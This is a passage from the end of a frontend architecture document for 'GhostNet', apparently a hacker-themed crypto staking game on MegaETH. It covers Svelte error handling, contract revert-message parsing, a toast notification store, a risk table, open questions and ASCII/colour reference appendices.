  let error = $state<Error | null>(null);
  
  onMount(() => {
    const handler = (event: ErrorEvent) => {
      error = event.error;
      onError?.(event.error);
      event.preventDefault();
    };
    
    window.addEventListener('error', handler);
    return () => window.removeEventListener('error', handler);
  });
</script>

{#if error && fallback}
  {@render fallback(error)}
{:else if error}
  <div class="error-fallback">
    <p>Something went wrong</p>
    <button onclick={() => location.reload()}>Refresh</button>
  </div>
{:else}
  {@render children()}
{/if}
```

### Transaction Error Handling

```typescript
// lib/core/web3/errors.ts

export function parseContractError(error: unknown): string {
  // Extract revert reason from various error formats
  const message = error instanceof Error ? error.message : String(error);
  
  // Known error patterns
  const patterns: Record<string, string> = {
    'Position locked: scan imminent': 'Cannot extract within 60 seconds of a scan. Wait for the scan to complete.',
    'Below minimum stake': 'Amount is below the minimum required for this level.',
    'Position is dead': 'Your position was traced. You can view your history in the dashboard.',
    'Deadline not reached': 'System reset timer has not expired yet.',
    'user rejected': 'Transaction was cancelled.',
    'insufficient funds': 'Insufficient ETH for gas fees.',
    'nonce too low': 'Transaction conflict. Please try again.',
  };
  
  for (const [pattern, userMessage] of Object.entries(patterns)) {
    if (message.toLowerCase().includes(pattern.toLowerCase())) {
      return userMessage;
    }
  }
  
  // Fallback: Show technical message (logged separately)
  return 'Transaction failed. Please try again.';
}
```

### Toast Notification System

```typescript
// lib/core/notifications/store.svelte.ts

export type ToastType = 'success' | 'error' | 'warning' | 'info';

interface Toast {
  id: string;
  type: ToastType;
  message: string;
  duration: number;
}

export function createToastStore() {
  let toasts = $state<Toast[]>([]);
  
  function add(type: ToastType, message: string, duration = 5000) {
    const id = crypto.randomUUID();
    toasts = [...toasts, { id, type, message, duration }];
    
    if (duration > 0) {
      setTimeout(() => remove(id), duration);
    }
    
    return id;
  }
  
  function remove(id: string) {
    toasts = toasts.filter(t => t.id !== id);
  }
  
  return {
    get toasts() { return toasts; },
    success: (msg: string) => add('success', msg),
    error: (msg: string) => add('error', msg, 8000), // Errors stay longer
    warning: (msg: string) => add('warning', msg),
    info: (msg: string) => add('info', msg),
    remove,
  };
}
```

---

## 16. Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| WebSocket reliability | Medium | High | Reconnection logic, offline indicator, local caching |
| Animation jank on mobile | Medium | Medium | CSS-only effects, test on low-end devices, disable option |
| Sound browser compat | Low | Low | Feature detection, graceful degradation |
| MegaETH tooling gaps | Medium | High | Abstract chain-specific code, prepare for changes |
| Real-time sync issues | Medium | High | Optimistic UI with reconciliation, event ordering |
| Large feed memory | Low | Medium | Virtualization, item limit, cleanup old items |

---

## 17. Open Questions

### Requires Research

| Question | Owner | Deadline |
|----------|-------|----------|
| MegaETH WebSocket endpoints available? | Backend | Week 1 |
| MegaETH block time / finality? | Backend | Week 1 |
| Chainlink VRF on MegaETH? | Contracts | Week 2 |
| RPC rate limits? | Backend | Week 1 |

### Requires Decision

| Question | Options | Recommendation |
|----------|---------|----------------|
| Backend API protocol | REST / GraphQL / tRPC | **tRPC** - Type-safe |
| Event indexing | The Graph / Custom | **Custom** - More control |
| Wallet library | wagmi / custom viem | **Custom viem** - Smaller |
| Animation library | GSAP / Motion One / CSS | **CSS + Motion One** |

---

## Appendices

### A. ASCII Art Reference

```
╔══════════════════════════════════════════════════════════════════╗
║  BOX DRAWING - DOUBLE                                             ║
╚══════════════════════════════════════════════════════════════════╝

┌──────────────────────────────────────────────────────────────────┐
│  BOX DRAWING - SINGLE                                             │
└──────────────────────────────────────────────────────────────────┘

╭──────────────────────────────────────────────────────────────────╮
│  BOX DRAWING - ROUNDED                                            │
╰──────────────────────────────────────────────────────────────────╯

Progress Bars:
████████████████░░░░░░░░░░░░░░░░ 50%
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░ 50%
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱ 50%

Status Indicators:
● Online    ○ Offline
◉ Active    ◎ Inactive
▲ Up        ▼ Down
✓ Success   ✗ Failed
⚠ Warning   ⛔ Error

Special:
Đ = $DATA token
💀 = Death/Traced
👻 = Ghost/Survived
💰 = Money/Extract
🔥 = Streak/Hot
🐋 = Whale
⚡ = Active boost
```

### B. Color Reference (Visual)

```
GHOSTNET COLOR PALETTE
══════════════════════

BACKGROUNDS
  ▓▓▓ #0a0a0a  --bg-primary     (near black)
  ▓▓▓ #0f0f0f  --bg-secondary   (panels)
  ▓▓▓ #1a1a1a  --bg-tertiary    (borders)

TERMINAL GREEN
  ▓▓▓ #00ff00  --green-bright   (primary)
  ▓▓▓ #00cc00  --green-mid      (secondary)
  ▓▓▓ #00aa00  --green-dim      (tertiary)

STATUS
  ▓▓▓ #00ffff  --cyan           (info)
  ▓▓▓ #ffaa00  --amber          (warning)
  ▓▓▓ #ff0000  --red            (danger)

MONEY
  ▓▓▓ #ffd700  --gold           (jackpot)
  ▓▓▓ #00ff88  --profit         (gains)
  ▓▓▓ #ff4444  --loss           (losses)
```

---

*Document End*

**Next Steps:**
1. Review and approve architecture
2. Begin Phase 1 implementation
3. Set up CI/CD pipeline
4. Create component storybook
